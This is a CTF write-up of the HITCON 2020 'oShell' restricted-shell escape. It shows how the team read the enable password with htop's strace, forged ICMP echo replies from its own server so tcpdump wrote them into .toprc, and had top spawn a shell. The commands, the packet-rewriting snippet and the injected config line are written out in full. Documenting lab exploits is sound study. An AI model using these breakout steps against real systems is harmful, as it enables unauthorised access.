# oShell  
_Category: ?_

## Description  
> Simple shell escaping!  
> (Same team-token keeps in the same environment)  
>  
> `ssh [email protected]` (pwd=oshell)  
>  
> Author: Orange

## Short Solution  
Connecting to the server gives users a restricted shell. This shell can
execute `htop` and `enable`. By using `htop` to run `strace` on the `enable`
process, it is possible to see the secret enable password, granting access to
more commands.

The elevated command shell enables the extra command `tcpdump`. This can be
used to write semi-arbitrary data (encapsulated packet payloads) contents to
an arbitrary file, in this case, the configuration file for the `top` utility:  
```sh  
tcpdump -w /home/oShell/.toprc -s 500 icmp  
```

Running `ping` from the environment allows us to solicit ICMP echo responses,
in which we control the payload section of the packet. We can embed valid
`top` configuration syntax in these responses (note that `top` will only parse
this is the components are separated by literal tab characters), and `tcpdump`
will write them to a file for us:  
```sh  
pipe    x       sh 1>&0  
```

Once this has been written to `.toprc`, we can run `top` and press
<kbd>shift</kbd> + <kbd>y</kbd>, <kbd>x</kbd>, and <kbd>return</kbd> to cause
top to launch `sh` for us.

Lastly, we can run `/readflag`, a suid root binary which outputs the flag.

## Long Solution  
### Initial Recon  
When connecting to the server we need to specify a "team-token", which grants
us access to a segregated container. This will come in handy later.  
```sh  
$ ssh [email protected]  
[email protected]'s password:  
Team token: [redacted]  
[*] Initializing instance...

Welcome to  
       __  _            _  _  
 ___  / _\| |__    ___ | || |  
/ _ \ \ \ | '_ \  / _ \| || |  
| (_) |_\ \| | | ||  __/| || |  
\___/ \__/|_| |_| \___||_||_|

shell~$  
```

This command shell looks like it's fairly restricted, and doesn't seem to be
based on any existing shell. We are able to get a list of commands we can run
using `help`:  
```sh  
oshell~$ help  
Available commands:  
 help  
 exit  
 id  
 ping  
 ping6  
 traceroute  
 traceroute6  
 arp  
 netstat  
 top  
 htop  
 enable  
```

We can also see that most of these binaries are just applets compiled in to
BusyBox:  
```sh  
oshell~$ ping --help  
BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.  
[...]  
```

At this stage, we can get some hints from the wonderfully useful
[GTFOBins](https://gtfobins.github.io/) project. This helps us figure out
which of the commands available to us can be used for breaking out of the
restricted shell.

The container stops running after 300 seconds at which the shell disconnects
and the container is rebuilt.

### Elevated Shell  
With the binaries we have access to there is no direct way to break out of the
restricted shell. Instead, we can focus on elevating our shell using the
`enable` command. This command asks for a password:  
```sh  
oshell~$ enable  
Password:  
Wrong password :(  
```

We can use the `strace` functionality of `htop` to analyze the process and
determine what it is doing. When we run the `enable` command, we don't see an
entry in `htop`:  
```sh  
 PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command  
  11 oShell     20   0  3512  1120   868 R  0.0  0.0  0:00.04 htop  
   1 root       20   0  1492     4     0 S  0.0  0.0  0:00.26 sleep 300  
   6 oShell     20   0 34516  5492  2040 S  0.0  0.0  0:00.35 python
/oShell.py  
```

This tells us that the `enable` command is part of the `oShell.py` script,
rather than an external binary.

Now we know what process it is, we can run `strace` using `htop` in one
window, while running `enable` in the other. To have `htop` run `strace` for
us we just need to press <kbd>s</kbd> while the Python process is selected:  
```  
{st_mode=S_IFCHR|0666, st_rdev=makedev(5, 0), ...}) = 0  
ioctl(3, TIOCGWINSZ, {ws_row=0, ws_col=0, ws_xpixel=0, ws_ypixel=0}) = 0  
ioctl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0  
ioctl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0  
ioctl(3, SNDCTL_TMR_CONTINUE or TCSETSF, {B38400 opost isig icanon -echo ...})
=  
writev(3, [{iov_base="Password: ", iov_len=10}, {iov_base=NULL, iov_len=0}],
2)  
readv(3, [{iov_base="", iov_len=0}, {iov_base="test\n", iov_len=1024}], 2) = 5  
ioctl(3, TCGETS, {B38400 opost isig icanon -echo ...}) = 0  
ioctl(3, SNDCTL_TMR_CONTINUE or TCSETSF, {B38400 opost isig icanon echo ...})
=  
writev(3, [{iov_base="", iov_len=0}, {iov_base="\n", iov_len=1}], 2) = 1  
close(3)                                = 0  
open("/enable.secret", O_RDONLY)        = 3  
fstat(3, {st_mode=S_IFREG|0444, st_size=31, ...}) = 0  
fstat(3, {st_mode=S_IFREG|0444, st_size=31, ...}) = 0  
lseek(3, 0, SEEK_CUR)                   = 0  
lseek(3, 0, SEEK_CUR)                   = 0  
readv(3, [{iov_base="this-is-secret-7ce3ff0e2c8fd2a7", iov_len=31},
{iov_base=""  
readv(3, [{iov_base="", iov_len=0}, {iov_base="", iov_len=1024}], 2) = 0  
close(3)                                = 0  
select(0, NULL, NULL, NULL, {tv_sec=1, tv_usec=0}) = 0 (Timeout)  
writev(1, [{iov_base="Wrong password :(", iov_len=17}, {iov_base="\n",
iov_len=1  
```

The relevant lines from this show us that it opens `/enable.secret`, then
reads the contents of the file. In this case, the enable password is revealed
to be `this-is-secret-7ce3ff0e2c8fd2a7`. This will change every time the
container rebuilds, but is relatively quick to find even manually each time.

Now we can execute `enable` and get an "elevated" shell:  
```sh  
oshell~$ enable  
Password:  
(enabled) oshell~#  
```

### Break Out Part 1 - Journey to File Write  
Now we have our elevated shell, we can see we get some extra commands
available to us:  
```sh  
(enabled) oshell~# help  
Available commands:  
 help  
 exit  
 id  
 ping  
 ping6  
 traceroute  
 traceroute6  
 arp  
 netstat  
 top  
 htop  
 ifconfig  
 tcpdump  
 enable  
```

The most interesting of these is `tcpdump`. This allows us to write a `pcap`
file to an arbitrary location on disk using the `-w` flag consisting of
packets received from the network. Unfortunately, the contents of this file
cannot be directly controlled as it encapsulates each packet with a pcap
header in the file. Fortunately, many Linux utilities are lenient in their
parsing of configuration files and so it is likely we can inject arbitrary
configuration lines that `top` will parse.

One of the simpliest ways to cause a packet to be recieved by `tcpdump` is the
`ping` command. On most ping implementations a pattern (`-p`) argument can be
used to supply the ping packet payload content. The version of `ping`
available in the environment is from `busybox`, which only allows a single
repeating byte to be specified as a payload:  
```sh  
$ ping --help  
BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.  
```

We got stuck here for a while thinking about ways to get a packet onto the
system. Our thoughts included:  
* Abusing the SSH connection used to access the environment to set up a tunnel  
* Traceroute ICMP responses with  
* Returning DNS PTR or A records with encoded payloads

Eventually we realised that while the system itself doesn't allow us to send
it incoming packets due to it being a container without a dedicated IP, it
does receive responses to `ping` Echo requests sent out to the Internet. This
gives us a chance to specify a custom payload in an Echo response, which will
be dutifully stored by `tcpdump`. To help us test this we used a script one of
our team members had prepared earlier, called [TLS Hello
Modify](https://github.com/fincham/nfqueue-break-tls-
handshake/blob/master/tls_hello_modify.py).

We modified this script to capture ICMP packets leaving a machine and
overwrite the payload field of those packets:  
```py  
payload = "payload goes here"  
parsed[ICMP].load = parsed[ICMP].load[0:len(parsed[ICMP].load) - len(payload)]
+ payload  
```

Initially we tried just replacing the entire payload, but this resulted in the
packets not being recieved by the server. As it wasn't clear at what point on
the network path these modified packets were being discarded, we didn't
investigate further, instead trying a few different ways of replacing or
modifying the ICMP payload until we managed to get a packet that got through
all the firewalls between our server and the CTF server. In English, the end
of the original ICMP content is replaced with our payload.

Putting this all together, we are able to run our `tcpdump` command and write
our payload to a path we specify. Now we just need a payload and path for it.

### Break Out Part 2 - Shell City  
Now we can concerntrate on getting a shell. One option is to use the `post-
rotate` command feature in `tcpdump`, but we investigated this and found the
use of `top` would be simpler due to it executing our process already attached
to our TTY.

The `top` command will read configuration from `~/.toprc`. This allows us to
specify arbitrary commands for `top` to execute through the "Inspect"
function. This is discussed in the [top GTFOBins
page](https://gtfobins.github.io/gtfobins/top/).

To begin, we need the full, expanded path to the `.toprc` file, which we can
get by launching `top` and pressing <kbd>w</kbd>:  
```  
Wrote configuration to '/home/oShell//.toprc'  
```

The payload we decided on was:  
```

pipe    x       sh 1>&0

```

This will simply execute a shell after we choose the `x` inspection option in
`top`. It's important to note:

* The tab characters before and after `x` are required and cannot be spaces.  
* The newlines before and after the payload are also required so that it doesn't have extra bytes around it.

### Break Out Part 3 - All together now  
Putting this together, we can run our ICMP modification script on a server we
control. We can run `tcpdump -w /home/oShell/.toprc -s 500 icmp` to capture
ICMP packets and write them to our `.toprc` file. Lastly, we can run `ping
[our-server-ip] -c 1` to send a packet and wait for the response.

This writes a strange, but still valid, file that `top` can interpret as a
configuration. Now we open `top`, press <kbd>shift</kbd> + <kbd>y</kbd> to
inspect a process, <kbd>return</kbd> to select the default PID, then select
<kbd>x</kbd> (the name of the command we used in our payload), and press
<kbd>return</kbd> a final time. We now have an interactive shell!

The formatting isn't great, but we can type `ls` to see the directory output
in `/`:  
```sh  
/ $ ls -lah  
total 908  
drwxr-xr-x    1 root     root        4.0K Nov 28 04:21 .  
drwxr-xr-x    1 root     root        4.0K Nov 28 04:21 ..  
-rwxr-xr-x    1 root     root           0 Nov 28 04:21 .dockerenv  
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 bin  
drwxr-xr-x    5 root     root         340 Nov 28 04:21 dev  
-r--r--r--    1 1002     1002          31 Nov 28 04:21 enable.secret  
drwxr-xr-x    1 root     root        4.0K Nov 28 04:21 etc  
-r--------    1 root     root          35 Nov 26 10:44 flag  
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 home  
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 lib  
drwxr-xr-x    5 root     root        4.0K Mar  6  2019 media  
drwxr-xr-x    2 root     root        4.0K Mar  6  2019 mnt  
-rwxrwxr--    1 root     root        3.8K Nov 25 10:23 oShell.py  
dr-xr-xr-x 1004 root     root           0 Nov 28 04:21 proc  
-rwsr-sr-x    1 root     root      825.4K Nov 19 10:54 readflag  
drwx------    2 root     root        4.0K Mar  6  2019 root  
drwxr-xr-x    2 root     root        4.0K Mar  6  2019 run  
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 sbin  
drwxr-xr-x    3 root     root        4.0K Nov 27 19:58 share  
drwxr-xr-x    2 root     root        4.0K Mar  6  2019 srv  
dr-xr-xr-x   13 root     root           0 Nov 28 04:21 sys  
drwxrwxrwt    2 root     root        4.0K Mar  6  2019 tmp  
drwxr-xr-x    1 root     root        4.0K Nov 27 19:58 usr  
drwxr-xr-x    1 root     root        4.0K Mar  6  2019 var  
```

From here, we can see a SUID `/readflag` which we can execute. This gives us
the flag!  
```sh  
/ $ ./readflag  
HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}  
```  

Original writeup (https://github.com/FrenchRoomba/ctf-writeup-HITCON-
CTF-2020/blob/master/oShell/README.md).